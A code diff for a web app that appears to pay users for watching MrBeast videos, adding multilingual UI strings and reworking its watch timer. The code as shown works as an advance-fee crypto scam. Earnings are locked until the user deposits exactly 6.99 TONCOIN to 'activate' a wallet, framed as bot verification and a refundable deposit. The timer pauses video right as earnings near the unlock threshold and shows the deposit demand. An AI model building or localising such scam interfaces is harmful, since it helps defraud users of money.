@@ -146,19 +146,19 @@
         }
         .ton-payment-actions button {
             min-height: 44px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
             border-radius: 12px;
             border: 1px solid rgba(0, 255, 204, 0.28);
             background: rgba(0, 255, 204, 0.1);
             color: #ffffff;
             font-weight: 900;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
             line-height: 1.25;
             white-space: normal;
             touch-action: manipulation;
-            cursor: pointer;
         }
         #payment-address-box {
             display: block;
@@ -2776,7 +2776,6 @@
         let currentWatchCompleted = false;
         let currentMrBeastVideoId = null;
         let watchSessionSubmitted = false;
-        let watchActivationStopInProgress = false;
         let watchSessionVideoIds = new Set();
         let lastWatchUiSnapshot = '';
         let rewardedMrBeastVideos = new Set();
@@ -4300,6 +4299,7 @@
             payment_address_available: "Confirm you are not a bot and connect your personal TON wallet.",
             pay_with_fiat: "CHECK PAYMENT",
             top_up_toncoin: "TOP UP 6.99 TONCOIN",
+            copy_ton_address: "COPY ADDRESS",
             fiat_desc: "Confirm that you are not a bot and connect your personal TON wallet to VidiPay. Top up exactly 6.99 TONCOIN to activate it. Blockchain network commission may apply.",
             card_selector_title: "TONCOIN wallet",
             card_maintenance: "Maintenance. This payment route is temporarily unavailable.",
@@ -4313,8 +4313,7 @@
             account_unlock_title: "Wallet activation",
             fastest_method: "Security confirmation",
             ton_deposit_title: "6.99 TONCOIN payment",
-            ton_deposit_address_title: "TON deposit address",
-                        ton_deposit_warning: "Send exactly 6.99 TONCOIN to this address. Less or more than 6.99 TONCOIN will not be confirmed automatically.",
+            ton_deposit_warning: "Send exactly 6.99 TONCOIN to this address. Less or more than 6.99 TONCOIN will not be confirmed automatically.",
             ton_deposit_send_status: "Send exactly {amount} TONCOIN. Other amounts are not confirmed automatically.",
             ton_deposit_waiting_status: "Waiting for exactly {amount} TONCOIN on TON network.",
             payment_address_label: "Unique TON deposit address",
@@ -5132,6 +5131,292 @@
             payment_address_label: "Einmalige TON Einzahlungsadresse"
         });
 
+
+        // frontend_language_completion_overrides_v20260703
+        const frontendLanguageCompletionOverrides = {
+            ru: {
+                time_spent: "\u0412\u0440\u0435\u043c\u044f \u0437\u0430 \u0434\u0435\u043d\u044c",
+                total_watch_time: "\u041e\u0431\u0449\u0435\u0435 \u0432\u0440\u0435\u043c\u044f \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0430",
+                wallet_current_balance: "\u0422\u0435\u043a\u0443\u0449\u0438\u0439 \u0431\u0430\u043b\u0430\u043d\u0441:",
+                withdrawal_method_label: "\u0421\u0435\u0442\u044c \u0430\u043a\u0442\u0438\u0432\u0430\u0446\u0438\u0438:",
+                pay_with_fiat: "\u041f\u0420\u041e\u0412\u0415\u0420\u0418\u0422\u042c \u041e\u041f\u041b\u0410\u0422\u0423",
+                copy_ton_address: "\u041a\u041e\u041f\u0418\u0420\u041e\u0412\u0410\u0422\u042c \u0410\u0414\u0420\u0415\u0421",
+                copy_link: "\u041a\u041e\u041f\u0418\u0420\u041e\u0412\u0410\u0422\u042c \u0421\u0421\u042b\u041b\u041a\u0423",
+                withdraw_history: "\u0418\u0441\u0442\u043e\u0440\u0438\u044f \u0432\u044b\u0432\u043e\u0434\u0430",
+                watch_title: "\u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 MrBeast",
+                watched_result: "\u0412\u0440\u0435\u043c\u044f \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0430:",
+                watch_result_title: "\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0432\u0438\u0434\u0435\u043e",
+                daily_info_title: "\u0415\u0436\u0435\u0434\u043d\u0435\u0432\u043d\u0430\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f",
+                daily_info_msg: "\u0412\u0440\u0435\u043c\u044f \u0438 \u0434\u043e\u0445\u043e\u0434 \u0437\u0430 \u0434\u0435\u043d\u044c \u0441\u0431\u0440\u0430\u0441\u044b\u0432\u0430\u044e\u0442\u0441\u044f \u043a\u0430\u0436\u0434\u044b\u0435 24 \u0447\u0430\u0441\u0430. \u041e\u0431\u0449\u0435\u0435 \u0432\u0440\u0435\u043c\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u0442\u0441\u044f.",
+                watch_previous: "\u041d\u0430\u0437\u0430\u0434",
+                watch_random: "\u0421\u043b\u0443\u0447\u0430\u0439\u043d\u043e",
+                watch_next: "\u0414\u0430\u043b\u0435\u0435",
+                watch_fullscreen: "\u041d\u0430 \u0432\u0435\u0441\u044c \u044d\u043a\u0440\u0430\u043d",
+                pending_reward: "\u041e\u0436\u0438\u0434\u0430\u0435\u043c\u0430\u044f \u043d\u0430\u0433\u0440\u0430\u0434\u0430:",
+                watch_reward_wait: "\u041d\u0430\u0433\u0440\u0430\u0434\u0430 \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u0441\u044f \u043f\u043e\u0441\u043b\u0435 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u044f \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u0432\u0438\u0434\u0435\u043e MrBeast.",
+                support_chat_title: "\u0427\u0430\u0442 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0438",
+                support_chat_greeting: "\u041d\u0430\u043f\u0438\u0448\u0438\u0442\u0435 \u0441\u0432\u043e\u0439 \u0432\u043e\u043f\u0440\u043e\u0441 \u0437\u0434\u0435\u0441\u044c. \u041f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430 \u043e\u0442\u0432\u0435\u0442\u0438\u0442 \u0432 \u044d\u0442\u043e\u043c \u0447\u0430\u0442\u0435.",
+                support_placeholder: "\u041d\u0430\u043f\u0438\u0448\u0438\u0442\u0435 \u0441\u0432\u043e\u0439 \u0432\u043e\u043f\u0440\u043e\u0441...",
+                fullscreen_unavailable: "\u041f\u043e\u043b\u043d\u043e\u044d\u043a\u0440\u0430\u043d\u043d\u044b\u0439 \u0440\u0435\u0436\u0438\u043c \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d \u043d\u0430 \u044d\u0442\u043e\u043c \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0435."
+            },
+            fr: {
+                time_spent: "Temps quotidien",
+                total_watch_time: "Temps total de visionnage",
+                wallet_current_balance: "Solde actuel :",
+                withdrawal_method_label: "Reseau d'activation :",
+                pay_with_fiat: "VERIFIER LE PAIEMENT",
+                copy_ton_address: "COPIER L'ADRESSE",
+                copy_link: "COPIER LE LIEN",
+                withdraw_history: "Historique des retraits",
+                watch_title: "Regarder MrBeast",
+                watched_result: "Temps regarde :",
+                watch_result_title: "Resultat video",
+                daily_info_title: "Info quotidienne",
+                daily_info_msg: "Le temps quotidien et le revenu quotidien se remettent a zero toutes les 24 heures. Le temps total reste enregistre.",
+                watch_previous: "Precedent",
+                watch_random: "Aleatoire",
+                watch_next: "Suivant",
+                watch_fullscreen: "Plein ecran",
+                pending_reward: "Recompense en attente :",
+                watch_reward_wait: "La recompense est ajoutee seulement apres la fin de la video MrBeast actuelle.",
+                support_chat_title: "Chat support",
+                support_chat_greeting: "Ecrivez votre question ici. Le support repondra dans ce chat.",
+                support_placeholder: "Ecrivez votre question...",
+                fullscreen_unavailable: "Le mode plein ecran n'est pas disponible sur cet appareil.",
+                withdraw_form_title: "Remboursement du depot d'activation",
+                withdraw_amount_placeholder: "Montant fixe du remboursement : 6.99 TONCOIN",
+                withdraw_card_placeholder: "Votre adresse wallet TON",
+                request_withdrawal: "DEMANDER LE REMBOURSEMENT",
+                deposit_refund_title: "Remboursement du depot d'activation",
+                deposit_refund_request: "Retirer uniquement le depot d'activation",
+                deposit_refund_saved: "Wallet de remboursement enregistre",
+                deposit_refund_returned: "Depot rembourse"
+            },
+            hi: {
+                time_spent: "Aaj ka watch time",
+                total_watch_time: "Kul watch time",
+                wallet_current_balance: "Maujooda balance:",
+                withdrawal_method_label: "Sakriya network:",
+                pay_with_fiat: "PAYMENT CHECK KAREIN",
+                copy_link: "LINK COPY KAREIN",
+                withdraw_history: "Withdraw itihaas",
+                watch_title: "MrBeast dekhein",
+                watched_result: "Dekha gaya samay:",
+                watch_result_title: "Video natija",
+                daily_info_title: "Roz ki jankari",
+                daily_info_msg: "Aaj ka watch time aur daily income har 24 ghante reset hota hai. Kul time save rehta hai.",
+                watch_previous: "Pichhla",
+                watch_random: "Achaanak",
+                watch_next: "Agla",
+                watch_fullscreen: "Pura screen",
+                pending_reward: "Pending reward:",
+                watch_reward_wait: "Reward current MrBeast video khatam hone ke baad add hoga.",
+                support_chat_title: "Madad chat",
+                support_chat_greeting: "Apna sawal yahan likhein. Support isi chat me reply karega.",
+                support_placeholder: "Apna sawal likhein...",
+                fullscreen_unavailable: "Is device par pura screen mode available nahi hai.",
+                withdraw_form_title: "Activation deposit wapas",
+                withdraw_amount_placeholder: "Fixed refund amount: 6.99 TONCOIN",
+                withdraw_card_placeholder: "Apna TON wallet address",
+                request_withdrawal: "DEPOSIT REFUND MANGEIN",
+                deposit_refund_title: "Activation deposit wapas",
+                deposit_refund_request: "Sirf activation deposit withdraw karein",
+                deposit_refund_saved: "Refund wallet save ho gaya",
+                deposit_refund_returned: "Deposit wapas ho gaya",
+                copy_ton_address: "ADDRESS COPY KAREIN",
+                ton_address_copied: "TON address copy ho gaya",
+                wallet_ready_for_activation: "Wallet activation ke liye ready hai",
+                ton_deposit_warning: "Is address par exactly 6.99 TONCOIN bhejein. Kam ya zyada amount automatic confirm nahi hoga.",
+                ton_deposit_send_status: "Exactly {amount} TONCOIN bhejein. Dusri amount automatic confirm nahi hogi.",
+                ton_deposit_waiting_status: "TON network par exactly {amount} TONCOIN ka wait ho raha hai.",
+                payment_address_label: "Unique TON deposit address"
+            },
+            es: {
+                time_spent: "Tiempo diario",
+                total_watch_time: "Tiempo total de visualizacion",
+                wallet_current_balance: "Saldo actual:",
+                withdrawal_method_label: "Red de activacion:",
+                pay_with_fiat: "VERIFICAR PAGO",
+                copy_ton_address: "COPIAR DIRECCION",
+                copy_link: "COPIAR ENLACE",
+                withdraw_history: "Historial de retiros",
+                watch_title: "Ver MrBeast",
+                watched_result: "Tiempo visto:",
+                watch_result_title: "Resultado del video",
+                daily_info_title: "Info diaria",
+                daily_info_msg: "El tiempo diario y el ingreso diario se reinician cada 24 horas. El tiempo total queda guardado.",
+                watch_previous: "Anterior",
+                watch_random: "Aleatorio",
+                watch_next: "Siguiente",
+                watch_fullscreen: "Pantalla completa",
+                pending_reward: "Recompensa pendiente:",
+                watch_reward_wait: "La recompensa se agrega solo despues de terminar el video MrBeast actual.",
+                support_chat_title: "Chat de soporte",
+                support_chat_greeting: "Escribe tu pregunta aqui. Soporte respondera en este chat.",
+                support_placeholder: "Escribe tu pregunta...",
+                fullscreen_unavailable: "El modo pantalla completa no esta disponible en este dispositivo."
+            },
+            zh: {
+                time_spent: "\u6bcf\u65e5\u89c2\u770b\u65f6\u95f4",
+                total_watch_time: "\u603b\u89c2\u770b\u65f6\u95f4",
+                wallet_current_balance: "\u5f53\u524d\u4f59\u989d:",
+                withdrawal_method_label: "\u6fc0\u6d3b\u7f51\u7edc:",
+                pay_with_fiat: "\u68c0\u67e5\u4ed8\u6b3e",
+                copy_ton_address: "\u590d\u5236\u5730\u5740",
+                copy_link: "\u590d\u5236\u94fe\u63a5",
+                withdraw_history: "\u63d0\u73b0\u5386\u53f2",
+                watch_title: "\u89c2\u770b MrBeast",
+                watched_result: "\u89c2\u770b\u65f6\u95f4:",
+                watch_result_title: "\u89c6\u9891\u7ed3\u679c",
+                daily_info_title: "\u6bcf\u65e5\u4fe1\u606f",
+                daily_info_msg: "\u6bcf\u65e5\u89c2\u770b\u65f6\u95f4\u548c\u6536\u5165\u6bcf24\u5c0f\u65f6\u91cd\u7f6e\uff0c\u603b\u65f6\u95f4\u4fdd\u7559\u3002",
+                watch_previous: "\u4e0a\u4e00\u4e2a",
+                watch_random: "\u968f\u673a",
+                watch_next: "\u4e0b\u4e00\u4e2a",
+                watch_fullscreen: "\u5168\u5c4f",
+                pending_reward: "\u5f85\u53d1\u5956\u52b1:",
+                watch_reward_wait: "\u5956\u52b1\u4f1a\u5728\u5f53\u524d MrBeast \u89c6\u9891\u7ed3\u675f\u540e\u6dfb\u52a0\u3002",
+                support_chat_title: "\u5ba2\u670d\u804a\u5929",
+                support_chat_greeting: "\u8bf7\u5728\u8fd9\u91cc\u5199\u4e0b\u60a8\u7684\u95ee\u9898\u3002\u5ba2\u670d\u4f1a\u5728\u6b64\u804a\u5929\u4e2d\u56de\u590d\u3002",
+                support_placeholder: "\u8bf7\u5199\u4e0b\u60a8\u7684\u95ee\u9898...",
+                fullscreen_unavailable: "\u6b64\u8bbe\u5907\u4e0d\u652f\u6301\u5168\u5c4f\u6a21\u5f0f\u3002"
+            },
+            de: {
+                time_spent: "Taegliche Wiedergabezeit",
+                total_watch_time: "Gesamte Wiedergabezeit",
+                wallet_current_balance: "Aktueller Kontostand:",
+                withdrawal_method_label: "Aktivierungsnetzwerk:",
+                pay_with_fiat: "ZAHLUNG PRUEFEN",
+                copy_ton_address: "ADRESSE KOPIEREN",
+                copy_link: "LINK KOPIEREN",
+                withdraw_history: "Auszahlungsverlauf",
+                watch_title: "MrBeast ansehen",
+                watched_result: "Angesehene Zeit:",
+                watch_result_title: "Videoergebnis",
+                daily_info_title: "Tagesinfo",
+                daily_info_msg: "Taegliche Wiedergabezeit und Tagesverdienst werden alle 24 Stunden zurueckgesetzt. Die Gesamtzeit bleibt gespeichert.",
+                watch_previous: "Zurueck",
+                watch_random: "Zufaellig",
+                watch_next: "Weiter",
+                watch_fullscreen: "Vollbild",
+                pending_reward: "Ausstehende Belohnung:",
+                watch_reward_wait: "Die Belohnung wird erst nach dem Ende des aktuellen MrBeast-Videos hinzugefuegt.",
+                support_chat_title: "Support-Chat",
+                support_chat_greeting: "Schreibe deine Frage hier. Der Support antwortet in diesem Chat.",
+                support_placeholder: "Schreibe deine Frage...",
+                fullscreen_unavailable: "Der Vollbildmodus ist auf diesem Geraet nicht verfuegbar."
+            }
+        };
+        Object.keys(frontendLanguageCompletionOverrides).forEach(lang => {
+            if (!languages[lang]) languages[lang] = {};
+            Object.assign(languages[lang], frontendLanguageCompletionOverrides[lang]);
+        });
+
+
+
+        // frontend_hindi_visible_labels_completion_v20260703
+        Object.assign(languages.hi, {
+            total_balance: "Kul balance",
+            earned_money: "Aaj ki income",
+            withdraw: "Nikaasi",
+            invite: "Dost jodein",
+            mdl_profile: "Account profile",
+            mdl_noti: "Notifications",
+            mdl_settings: "Vinyas",
+            lang_title: "Bhasha",
+            support_title: "Madad markaz",
+            support_btn: "Madad se baat karein",
+            profile_username: "Nickname:",
+            profile_balance: "Balance:",
+            profile_total_time: "Kul time:",
+            profile_daily_income: "Aaj ki income:",
+            profile_referrals: "Dost:",
+            profile_ref_link: "Referral link",
+            leave_app: "Log out",
+            delete_account: "Account delete karein",
+            bonus: "Inaam",
+            bonus_title: "Referral inaam",
+            bonus_status_title: "Inaam status:",
+            bonus_locked_text: "Inaam withdrawal time tak locked rahega.",
+            bonus_open_text: "Inaam unlock ho gaya. Ab ise main balance me add kar sakte hain.",
+            bonus_timer_text: "Inaam timer withdrawal timer ke saath chalega.",
+            claim_bonus_locked: "INAAM LOCKED",
+            claim_bonus_open: "INAAM CLAIM KAREIN",
+            bonus_claimed: "Inaam main balance me add hua:",
+            bonus_per_friend: "Har joined dost ka inaam:",
+            total_bonus: "Kul inaam",
+            friends_joined: "Joined dost",
+            referral_link_title: "Aapka referral link",
+            wallet: "Batuwa",
+            history: "Itihaas",
+            wallet_title: "Batuwa",
+            withdraw_history: "Nikaasi itihaas",
+            watch_title: "MrBeast dekhein",
+            watched_time: "Dekha gaya samay:",
+            watch_wait: "MrBeast videos count ho rahe hain. Reward is screen se nikalne par add hoga.",
+            watch_loading: "YouTube player load ho raha hai. MrBeast video automatic khulega.",
+            watch_playing: "MrBeast video chal raha hai. Time videos ke beech bhi count hota rahega.",
+            watch_counting: "Video dekha ja raha hai... reward is screen se nikalne par add hoga.",
+            watch_finished: "Video khatam ho gaya. Agla MrBeast video isi session ko continue kar sakta hai.",
+            watched_result: "Dekha gaya samay:",
+            earned_result: "Kamai:",
+            not_enough_time: "Watch time kam hai. Balance add nahi hua.",
+            watch_added: "Aap logo screen se nikle. Watch time aur kamai main page me add ho gayi.",
+            wallet_locked: "Batuwa locked hai",
+            account_deleted: "Account delete request complete ho gayi. Ye account ab blocked hai.",
+            confirm_delete: "Account delete karein? Is account se earn ya withdraw nahi kar paayenge.",
+            not_scheduled: "Schedule nahi hua",
+            opening_date: "Opening date",
+            closing_date: "Closing date",
+            expired_date: "Expired date",
+            withdraw_open_title: "Nikaasi open hai",
+            withdraw_open_message: "Nikaasi active hai. TON payout request submit karein.",
+            withdraw_closed_title: "Nikaasi closed hai",
+            withdraw_not_scheduled_message: "Withdrawal time abhi schedule nahi hua.",
+            withdraw_waiting_title: "Withdrawal time ka wait",
+            withdraw_waiting_message: "Batuwa aur withdrawal scheduled date par automatic open honge.",
+            withdraw_expired_title: "Withdrawal time expire ho gaya",
+            withdraw_expired_message: "Last withdrawal window khatam ho gaya. Agle schedule tak batuwa locked rahega.",
+            withdraw_request_available: "Withdrawal request available hai",
+            withdraw_enter_details: "Apna TON wallet dhyan se enter karein. Activation refund payout 6.99 TONCOIN hai.",
+            payment_verified_withdraw: "Payment verify ho gaya. Withdrawal available hai.",
+            payment_required_withdraw: "Withdrawal activate karne ke liye TON par 6.99 TONCOIN deposit karein.",
+            activation_deposit_required: "Wallet activate karne ke liye exactly 6.99 TONCOIN deposit karein. Blockchain service commission lag sakti hai.",
+            activation_refund_available: "Available refund payout",
+            payout_request_now: "Ab payout request submit kar sakte hain.",
+            payment_check_status: "Required payment complete karke status check karein.",
+            send_payment_check_status: "Required payment complete karke status check karein.",
+            payment_address_available: "Activation payment address neeche available hai.",
+            withdraw_not_started: "Withdrawal time abhi start nahi hua.",
+            wallet_locked_until_time: "Scheduled time tak batuwa aur payment address locked rahenge.",
+            admin_message: "Admin message",
+            mark_all_read: "SAB READ KAREIN",
+            active_tier_label: "Sakriya tier",
+            network_label: "Jaal",
+            source_label: "Srot",
+            reward_label: "Inaam",
+            per_second_label: "prati second",
+            unknown_network: "Anjaan jaal",
+            unknown_country: "Anjaan",
+            no_history: "Abhi payment ya withdrawal history nahi hai.",
+            receipt_date_time: "Date aur time",
+            receipt_network: "Jaal",
+            receipt_verified_at: "Verified at",
+            receipt_note: "Note",
+            tier1_title: "Tier 1 desh",
+            tier2_title: "Tier 2 desh",
+            tier3_title: "Tier 3 desh",
+            tier1_countries: "United States, Australia, Canada, Norway, Switzerland, Germany, United Kingdom, Netherlands, Sweden, Denmark",
+            tier2_countries: "France, Belgium, Austria, Finland, Ireland, New Zealand, Italy, Spain, Japan, South Korea",
+            tier3_countries: "Baaki sab desh worldwide",
+            pay_with_fiat: "PAYMENT CHECK KAREIN",
+            fastest_method: "Security confirmation",
+            or_crypto: "TON NETWORK PAYMENT",
+            account_unlock_title: "Wallet activation",
+            card_selector_title: "TON wallet"
+        });
+
+
         Object.keys(languages).forEach(lang => {
             if (lang === 'en') return;
             Object.keys(languages.en).forEach(key => {
@@ -5149,6 +5434,7 @@
                 modal.style.display = 'none';
             });
             
+            // Keyin yangi oynani mustaqil ochamiz
             const modal = document.getElementById(id);
             if (modal) {
                 modal.classList.add('is-open');
@@ -5993,10 +6279,11 @@
                 }
 
                 syncCountedWatchSeconds();
-                updateWatchSessionUi(t('watch_counting'));
                 if (shouldStopWatchAtActivationLimit(countedWatchSeconds)) {
                     stopWatchAtActivationLimit();
+                    return;
                 }
+                updateWatchSessionUi(t('watch_counting'));
             }, 1000);
         }
 
@@ -6005,35 +6292,29 @@
             return Number((Math.max(0, Number(seconds || 0)) * rate).toFixed(2));
         }
 
-        function shouldStopWatchAtActivationLimit(seconds) {
-            if (latestPaymentStatus?.withdraw_unlocked) return false;
-            const required = getWalletUnlockRequiredAmount();
-            const current = getWalletEarningAmount();
-            if (current >= required) return true;
-            return current + estimateWatchReward(seconds) >= required;
+        function shouldStopWatchAtActivationLimit(seconds = countedWatchSeconds) {
+            const watchedSeconds = Math.max(0, Number(seconds || 0));
+            const requiredSeconds = Number(backendSettings.view_seconds_required || 5);
+            const requiredAmount = getWalletUnlockRequiredAmount();
+            const currentAmount = getWalletEarningAmount();
+            if (currentAmount >= requiredAmount) return true;
+            if (watchedSeconds < requiredSeconds) return false;
+            return currentAmount + estimateWatchReward(watchedSeconds) >= requiredAmount;
         }
 
-        function stopWatchAtActivationLimit() {
-            if (watchActivationStopInProgress || watchSessionSubmitted) return;
-            watchActivationStopInProgress = true;
+        async function stopWatchAtActivationLimit() {
+            if (!pendingWatch || watchSessionSubmitted) return;
+            updateWatchSessionUi(t('activation_deposit_required'));
             if (mrbeastPlayer && mrbeastPlayer.pauseVideo) {
-                mrbeastPlayer.pauseVideo();
+                try { mrbeastPlayer.pauseVideo(); } catch (_) {}
             }
             clearWatchFallbackPlayer();
             clearInterval(watchTimerInterval);
-            updateWatchSessionUi(t('activation_deposit_required'));
-            closeModal('watchModal');
-            finalizeWatchSession()
-                .catch(err => {
-                    const watchSeconds = syncCountedWatchSeconds();
-                    showWatchResult(watchSeconds, estimateWatchReward(watchSeconds), err.message || t('watch_reward_save_failed'));
-                })
-                .finally(() => {
-                    watchActivationStopInProgress = false;
-                    updateWalletLockUi();
-                    updateGrowthLockUi();
-                    refreshPaymentStatus().catch(() => null);
-                });
+            await finalizeWatchSession().catch(err => {
+                const watchSeconds = syncCountedWatchSeconds();
+                showWatchResult(watchSeconds, estimateWatchReward(watchSeconds), err.message || t('watch_reward_save_failed'));
+            });
+            updateGrowthLockUi();
         }
 
         async function finalizeWatchSession() {
@@ -6516,9 +6797,9 @@
             const addressEl = document.getElementById('payment-address-text');
             const expiryEl = document.getElementById('payment-expiry-text');
             if (addressBox) addressBox.style.display = 'block';
-            setDomText(amountEl, `${TON_ACTIVATION_AMOUNT.toFixed(2)} TONCOIN`);
-            setDomText(addressEl, t('card_order_loading'));
-            setDomText(expiryEl, '');
+            if (amountEl) amountEl.innerText = `${getTonActivationAmount().toFixed(2)} TONCOIN`;
+            if (addressEl) addressEl.innerText = t('card_order_loading');
+            if (expiryEl) expiryEl.innerText = '';
             setDomText(statusEl, t('card_order_loading'));
 
             try {
